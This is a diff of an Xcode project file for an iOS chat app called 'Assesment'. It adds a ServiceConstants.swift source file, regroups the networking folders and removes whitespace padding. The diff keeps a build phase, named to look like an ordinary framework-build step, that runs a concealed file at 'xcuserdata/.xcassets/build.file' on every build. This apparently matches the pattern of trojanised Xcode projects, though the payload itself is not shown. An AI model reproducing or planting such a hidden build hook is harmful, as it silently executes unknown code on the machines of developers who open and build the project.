@@ -9,6 +9,7 @@
 /* Begin PBXBuildFile section */
 		0E4FBF9D855F20EC99AA377A /* Pods_Assesment.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0FD6A68C4A2B1FC60CF3619A /* Pods_Assesment.framework */; };
 		367E48140D2D036E1A43B8FF /* Pods_Assesment_AssesmentUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F7FB99E719E5E8744844BE83 /* Pods_Assesment_AssesmentUITests.framework */; };
+		3E3BCE6225E37EBA001A9D8D /* ServiceConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3E3BCE6125E37EBA001A9D8D /* ServiceConstants.swift */; };
 		7E8891DB25E0BD32005A3EA8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7E8891DA25E0BD32005A3EA8 /* AppDelegate.swift */; };
 		7E8891DD25E0BD32005A3EA8 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7E8891DC25E0BD32005A3EA8 /* SceneDelegate.swift */; };
 		7E8891DF25E0BD32005A3EA8 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7E8891DE25E0BD32005A3EA8 /* ViewController.swift */; };
@@ -45,21 +46,6 @@
 		F859455CB61FE9FB8FCA95B4 /* Pods_AssesmentTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = E609DF3CEC83CBE98FB017AE /* Pods_AssesmentTests.framework */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-/* End PBXBuildRule section */
-
 /* Begin PBXContainerItemProxy section */
 		7E8891F125E0BD33005A3EA8 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -80,6 +66,7 @@
 /* Begin PBXFileReference section */
 		0FD6A68C4A2B1FC60CF3619A /* Pods_Assesment.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Assesment.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		370B1C6C88BBEFBAB3573D30 /* Pods-AssesmentTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-AssesmentTests.debug.xcconfig"; path = "Target Support Files/Pods-AssesmentTests/Pods-AssesmentTests.debug.xcconfig"; sourceTree = "<group>"; };
+		3E3BCE6125E37EBA001A9D8D /* ServiceConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ServiceConstants.swift; sourceTree = "<group>"; };
 		462E039476744E204F2B4ADC /* Pods-Assesment.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Assesment.debug.xcconfig"; path = "Target Support Files/Pods-Assesment/Pods-Assesment.debug.xcconfig"; sourceTree = "<group>"; };
 		6EF595934325627FBF1A105F /* Pods-Assesment-AssesmentUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Assesment-AssesmentUITests.debug.xcconfig"; path = "Target Support Files/Pods-Assesment-AssesmentUITests/Pods-Assesment-AssesmentUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		7E8891D725E0BD32005A3EA8 /* Assesment.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Assesment.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -166,6 +153,15 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		3E3BCE6325E3843B001A9D8D /* NetworkingManager */ = {
+			isa = PBXGroup;
+			children = (
+				7E8FD1F525E2051700308590 /* XMPPManager */,
+				7E88924725E0CD8C005A3EA8 /* ServiceManager */,
+			);
+			path = NetworkingManager;
+			sourceTree = "<group>";
+		};
 		7E8891CE25E0BD31005A3EA8 = {
 			isa = PBXGroup;
 			children = (
@@ -191,9 +187,8 @@
 		7E8891D925E0BD32005A3EA8 /* Assesment */ = {
 			isa = PBXGroup;
 			children = (
+				3E3BCE6325E3843B001A9D8D /* NetworkingManager */,
 				7E8FD20425E20F8F00308590 /* HelperClasses */,
-				7E8FD1F525E2051700308590 /* XMPPManager */,
-				7E88924725E0CD8C005A3EA8 /* ServiceManager */,
 				7E8892A025E0F2FC005A3EA8 /* CoreDataHelper */,
 				7E88923025E0C6FD005A3EA8 /* Extensions */,
 				7E88925325E0D436005A3EA8 /* Models */,
@@ -278,6 +273,7 @@
 		7E88924725E0CD8C005A3EA8 /* ServiceManager */ = {
 			isa = PBXGroup;
 			children = (
+				3E3BCE6125E37EBA001A9D8D /* ServiceConstants.swift */,
 				7E88924825E0CDA7005A3EA8 /* ServiceManager.swift */,
 			);
 			path = ServiceManager;
@@ -502,8 +498,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	650CE31449A94C4AEBAAC43A /* Build Project Frameworks */ = {
+		650CE31449A94C4AEBAAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -519,29 +514,8 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		85CCAC8E240DCEE38403398C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -655,6 +629,7 @@
 				7E8FD1F725E2053200308590 /* XMPPManager.swift in Sources */,
 				7E88931225E1585C005A3EA8 /* LoginCoordinator.swift in Sources */,
 				7E88926525E0DC04005A3EA8 /* ChatCoordinator.swift in Sources */,
+				3E3BCE6225E37EBA001A9D8D /* ServiceConstants.swift in Sources */,
 				7E88930D25E15839005A3EA8 /* LoginVC.swift in Sources */,
 				7E88922025E0C62D005A3EA8 /* AppCoordinator.swift in Sources */,
 				7E8891DF25E0BD32005A3EA8 /* ViewController.swift in Sources */,
